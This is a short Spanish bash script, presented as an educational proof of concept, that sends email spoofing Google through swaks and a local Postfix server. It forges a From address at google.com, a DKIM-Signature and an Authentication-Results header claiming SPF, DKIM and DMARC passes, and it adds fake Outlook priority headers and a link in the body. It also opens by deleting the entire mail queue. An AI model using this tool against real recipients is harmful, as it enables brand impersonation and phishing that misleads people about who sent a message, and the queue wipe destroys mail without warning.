#!/bin/bash
##################################################
# Prueba de concepto POC, requiere smarks
# suplanta a google.com
# simula cabeceras X-Mailer modificadas
# simula verificaciones SPF, DKIN, DMARK
# (R) hackingyseguridad.com 2025
# @antonio_taboada solo con fines educativos
################################################
#

# Eliminar cola de correos en servidor SMTP  Postfix
postsuper -d ALL
# requiere smarks
# (r) hackingyseguridad.com 2025
# @antonio_taboada

send_email_swaks() {
    local from_email="notificaciones@google.com"
    local to_email="antonio.taboada@telefonica.net"
    local message_id="<$(date +%s%N | sha256sum | cut -c1-32)@google.com>"

    echo "..."
    swaks --to "$to_email" \
          --from "$from_email" \
          --server localhost \
          --h-Subject "Prueba" \
          --h-From "Notificaciones Google <$from_email>" \
          --h-DKIM-Signature "v=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=selector1; t=$(date +%s)" \
          --h-Authentication-Results "mx.google.com; spf=pass; dkim=pass; dmarc=pass" \
          --h-Message-ID "$message_id" \
          --h-Date "$(date -R)" \
          --h-User-Agent "Microsoft Outlook 16.0" \
          --h-X-Mailer "Microsoft Outlook 16.0" \
          --h-MIME-Version "1.0" \
          --h-Content-Type "text/html; charset=\"utf-8\"" \
          --h-X-Priority "1" \
          --h-X-MSMail-Priority "High" \
          --h-Importance "High" \
          --h-X-Outlook-Flags "0x00000001" \
          --h-X-Outlook-Sensitivity "0" \
          --h-X-Outlook-Importance "1" \
          --h-X-Outlook-Priority "1" \
          --h-X-Outlook-Category "Urgente" \
          --h-X-Outlook-Message-State "Read" \
          --body "<html><body><p>correo electronico de prueba con todas las verificaciones de seguridad pasadas. ;) <a href=\"http://www.hackingyseguridad.com/\">http://www.hackingyseguridad.com/</a></p></body></html>" \
          --add-header "X-Priority: 1" \
          --add-header "Importance: high" \
          --add-header "X-Outlook-Message-ID: $message_id"
}
    send_email_swaks
echo
postqueue -f
echo
echo "-> Para limpiar la cola de envio del servidor SMTP en localhost: postsuper -d ALL"
echo
sleep 3
mailq
echo "..."
echo

echo "ultimos logs postfix: "
echo "================================================="
    if command -v journalctl &>/dev/null; then
        journalctl -u postfix -n 20 --since "1 minute ago" 2>/dev/null || \
        tail -20 /var/log/mail.log 2>/dev/null || \
        echo "[!] No se pudieron leer los logs. Revisa manualmente."
    else
        tail -30 /var/log/mail.log 2>/dev/null || \
        echo "[!] Archivo de logs no accesible."
    fi

    echo "...."
